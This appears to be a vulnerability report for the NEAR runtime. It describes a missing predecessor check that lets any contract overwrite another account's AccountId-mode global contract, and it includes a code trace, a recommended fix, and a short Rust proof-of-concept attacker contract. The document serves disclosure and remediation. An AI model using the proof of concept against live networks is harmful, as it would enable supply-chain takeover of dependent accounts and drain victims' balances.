### Title
Unauthorized Overwrite of Any Account's `AccountId`-Mode Global Contract via Cross-Contract Promise — (`runtime/runtime/src/global_contracts.rs`)

---

### Summary

`action_deploy_global_contract` in `runtime/runtime/src/global_contracts.rs` does not verify that the receipt's predecessor equals the receipt's receiver when `deploy_mode == AccountId`. Any unprivileged contract can create a cross-contract promise targeting victim account B and append a `DeployGlobalContractByAccountId` action, overwriting the global contract stored under B's account ID. All accounts that reference B's global contract via `GlobalContractIdentifier::AccountId(B)` will subsequently execute the attacker's bytecode.

---

### Finding Description

`GlobalContractDeployMode::AccountId` is documented as allowing "the owner to update the contract for all its users." The owner is the account whose ID is used as the global-contract namespace key. The invariant is: **only account B may write to `TrieKey::GlobalContractCode { identifier: AccountId(B) }`**.

The execution path is:

```
promise_batch_action_deploy_global_contract_by_account_id   (host fn, logic.rs:2558)
  → ext.append_action_deploy_global_contract(receipt_idx, code, AccountId)
  → receipt targeting victim B is queued
  → apply_action (lib.rs:593)
  → action_deploy_global_contract (global_contracts.rs:23)
  → initiate_distribution (global_contracts.rs:141)
      id = GlobalContractIdentifier::AccountId(account_id)   // account_id == B
      nonce = increment_nonce(state_update, &id)
      result.new_receipts.push(distribution_receipt)
  → apply_distribution_current_shard (global_contracts.rs:189)
      state_update.set(TrieKey::GlobalContractCode { identifier: AccountId(B) }, attacker_code)
```

At no point is there a check that `receipt.predecessor_id() == account_id` (i.e., that the action was self-initiated by B). The only guard is a balance check:

```rust
// global_contracts.rs:39
let Some(updated_balance) = account.amount().checked_sub(storage_cost) else { ... };
```

This charges B's balance, but does not prevent the overwrite — it only fails if B has insufficient funds. The nonce guard in `check_and_update_nonce` (line 250) only prevents stale re-delivery of the same distribution receipt; it does not restrict who may initiate a new distribution.

The host function is gated behind `#[global_contract_host_fns]` (enabled by the `GlobalContractHostFns` protocol feature, introduced in the `77.yaml` parameter set), but once that feature is live, the attack is fully reachable by any unprivileged user with a deployed contract.

---

### Impact Explanation

**Critical.** An attacker who controls any deployed contract can:

1. Overwrite the global contract stored under any victim account B's ID with arbitrary malicious WASM bytecode.
2. Cause every account that has called `UseGlobalContract(AccountId(B))` to execute the attacker's code on their next function call — a protocol-level supply-chain attack.
3. Drain B's account balance by the storage cost (`global_contract_storage_amount_per_byte × code_size`).

The corrupted trie value is `TrieKey::GlobalContractCode { identifier: GlobalContractCodeIdentifier::AccountId(B) }`, which is written unconditionally at `global_contracts.rs:210`:

```rust
state_update.set(trie_key, global_contract_data.code().to_vec());
```

---

### Likelihood Explanation

**High.** The attack requires only:

1. Any account with a deployed contract (no special privilege).
2. Calling `promise_batch_create(B)` followed by `promise_batch_action_deploy_global_contract_by_account_id(promise_idx, malicious_code_len, malicious_code_ptr)` from within that contract.
3. Returning the promise so the receipt is dispatched.

No validator, operator, or admin privilege is needed. The victim account B does not need to interact with the attacker at all.

---

### Recommendation

In `action_deploy_global_contract`, add an authorization guard for `AccountId` deploy mode: the receipt's predecessor must equal the receiver (the account whose ID is used as the key).

```rust
// runtime/runtime/src/global_contracts.rs  (inside action_deploy_global_contract)
if deploy_contract.deploy_mode == GlobalContractDeployMode::AccountId {
    // Only the account itself may publish a global contract under its own ID.
    // The receipt predecessor is the caller; for a self-initiated action it equals account_id.
    if receipt.predecessor_id() != account_id {
        result.result = Err(ActionErrorKind::ActorNoPermission {
            account_id: account_id.clone(),
            actor_id: receipt.predecessor_id().clone(),
        }.into());
        return Ok(());
    }
}
```

Alternatively, enforce this at the action-validation layer so the receipt is rejected before execution.

---

### Proof of Concept

```rust
// Attacker's contract (deployed on account "attacker.near")
#[no_mangle]
pub fn overwrite_victim_global_contract() {
    // Malicious WASM bytecode to inject
    let malicious_code: Vec<u8> = include_bytes!("malicious.wasm").to_vec();

    // Create a promise targeting victim account "victim.near"
    let promise_idx = env::promise_batch_create("victim.near");

    // Append DeployGlobalContract(AccountId) action — no authorization check exists
    env::promise_batch_action_deploy_global_contract_by_account_id(
        promise_idx,
        &malicious_code,
    );

    env::promise_return(promise_idx);
}
```

**Result**: The receipt executes on `victim.near`. `action_deploy_global_contract` is called with `account_id = "victim.near"` and `deploy_mode = AccountId`. `initiate_distribution` stores the malicious code under `GlobalContractCodeIdentifier::AccountId("victim.near")`. Every account that previously called `UseGlobalContract(AccountId("victim.near"))` now executes the attacker's code on their next function call. `victim.near`'s balance is reduced by the storage cost.

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** runtime/runtime/src/global_contracts.rs (L23-61)
```rust
pub(crate) fn action_deploy_global_contract(
    state_update: &mut TrieUpdate,
    account: &mut Account,
    account_id: &AccountId,
    apply_state: &ApplyState,
    deploy_contract: &DeployGlobalContractAction,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let _span = tracing::debug_span!(target: "runtime", "action_deploy_global_contract").entered();

    let storage_cost = apply_state
        .config
        .fees
        .storage_usage_config
        .global_contract_storage_amount_per_byte
        .saturating_mul(deploy_contract.code.len() as u128);
    let Some(updated_balance) = account.amount().checked_sub(storage_cost) else {
        result.result = Err(ActionErrorKind::LackBalanceForState {
            account_id: account_id.clone(),
            amount: storage_cost,
        }
        .into());
        return Ok(());
    };
    result.tokens_burnt =
        result.tokens_burnt.checked_add(storage_cost).ok_or(IntegerOverflowError)?;
    account.set_amount(updated_balance);

    initiate_distribution(
        state_update,
        account_id.clone(),
        deploy_contract.code.clone(),
        &deploy_contract.deploy_mode,
        apply_state.shard_id,
        result,
    )?;

    Ok(())
}
```

**File:** runtime/runtime/src/global_contracts.rs (L141-169)
```rust
fn initiate_distribution(
    state_update: &mut TrieUpdate,
    account_id: AccountId,
    contract_code: Arc<[u8]>,
    deploy_mode: &GlobalContractDeployMode,
    current_shard_id: ShardId,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let id = match deploy_mode {
        GlobalContractDeployMode::CodeHash => {
            GlobalContractIdentifier::CodeHash(hash(&contract_code))
        }
        GlobalContractDeployMode::AccountId => {
            GlobalContractIdentifier::AccountId(account_id.clone())
        }
    };
    // Increment the nonce and write it to state immediately to prevent multiple
    // distributions with the same nonce from being initiated. This requires
    // allowing the same nonce in the freshness check when applying the
    // distribution receipt.
    let nonce = increment_nonce(state_update, &id)?;
    let distribution_receipt =
        GlobalContractDistributionReceipt::new(id, current_shard_id, vec![], contract_code, nonce);
    let distribution_receipts =
        Receipt::new_global_contract_distribution(account_id, distribution_receipt);
    // No need to set receipt_id here, it will be generated as part of apply_action_receipt
    result.new_receipts.push(distribution_receipts);
    Ok(())
}
```

**File:** runtime/runtime/src/global_contracts.rs (L189-233)
```rust
fn apply_distribution_current_shard(
    receipt: &Receipt,
    global_contract_data: &GlobalContractDistributionReceipt,
    apply_state: &ApplyState,
    state_update: &mut TrieUpdate,
) -> Result<Compute, RuntimeError> {
    let identifier = match &global_contract_data.id() {
        GlobalContractIdentifier::CodeHash(hash) => GlobalContractCodeIdentifier::CodeHash(*hash),
        GlobalContractIdentifier::AccountId(account_id) => {
            GlobalContractCodeIdentifier::AccountId(account_id.clone())
        }
    };

    let is_nonce_fresh = check_and_update_nonce(global_contract_data, &identifier, state_update)?;
    if !is_nonce_fresh {
        return Ok(0);
    }

    let config = apply_state.config.wasm_config.clone();
    let trie_key = TrieKey::GlobalContractCode { identifier };
    let code_len = global_contract_data.code().len() as u64;
    state_update.set(trie_key, global_contract_data.code().to_vec());
    state_update.commit(StateChangeCause::ReceiptProcessing { receipt_hash: receipt.get_hash() });
    let code_hash = match global_contract_data.id() {
        GlobalContractIdentifier::CodeHash(hash) => Some(*hash),
        GlobalContractIdentifier::AccountId(_) => None,
    };
    precompile_contract_with_warming(
        &ContractCode::new(global_contract_data.code().to_vec(), code_hash),
        config,
        apply_state.next_wasm_config.clone(),
        apply_state.cache.as_deref(),
    );
    near_vm_runner::report_metrics(apply_state.shard_id, "global_contract");
    let fees = &apply_state.config.fees;
    let per_byte_total = fees
        .deploy_global_contract_execution_per_byte
        .checked_mul(code_len)
        .ok_or(IntegerOverflowError)?;
    let compute = fees
        .deploy_global_contract_execution_base
        .checked_add(per_byte_total)
        .ok_or(IntegerOverflowError)?;
    Ok(compute)
}
```

**File:** runtime/near-vm-runner/src/logic/logic.rs (L2558-2599)
```rust
    pub fn promise_batch_action_deploy_global_contract_by_account_id(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
    ) -> Result<()> {
        self.promise_batch_action_deploy_global_contract_impl(
            promise_idx,
            code_len,
            code_ptr,
            GlobalContractDeployMode::AccountId,
            "promise_batch_action_deploy_global_contract_by_account_id",
        )
    }

    fn promise_batch_action_deploy_global_contract_impl(
        &mut self,
        promise_idx: u64,
        code_len: u64,
        code_ptr: u64,
        mode: GlobalContractDeployMode,
        method_name: &str,
    ) -> Result<()> {
        self.result_state.gas_counter.pay_base(base)?;
        if self.context.is_view() {
            return Err(HostError::ProhibitedInView { method_name: method_name.to_owned() }.into());
        }
        let code = get_memory_or_register!(self, code_ptr, code_len)?;
        let code_len = code.len() as u64;
        let limit = self.config.limit_config.max_contract_size;
        if code_len > limit {
            return Err(HostError::ContractSizeExceeded { size: code_len, limit }.into());
        }
        let code = code.into_owned();

        let (receipt_idx, sir) = self.promise_idx_to_receipt_idx_with_sir(promise_idx)?;

        self.pay_action_base(ActionCosts::deploy_global_contract_base, sir)?;
        self.pay_action_per_byte(ActionCosts::deploy_global_contract_byte, code_len, sir)?;

        self.ext.append_action_deploy_global_contract(receipt_idx, code, mode);
        Ok(())
```

**File:** core/primitives/src/action/mod.rs (L133-142)
```rust
pub enum GlobalContractDeployMode {
    /// Contract is deployed under its code hash.
    /// Users will be able reference it by that hash.
    /// This effectively makes the contract immutable.
    CodeHash,
    /// Contract is deployed under the owner account id.
    /// Users will be able reference it by that account id.
    /// This allows the owner to update the contract for all its users.
    AccountId,
}
```
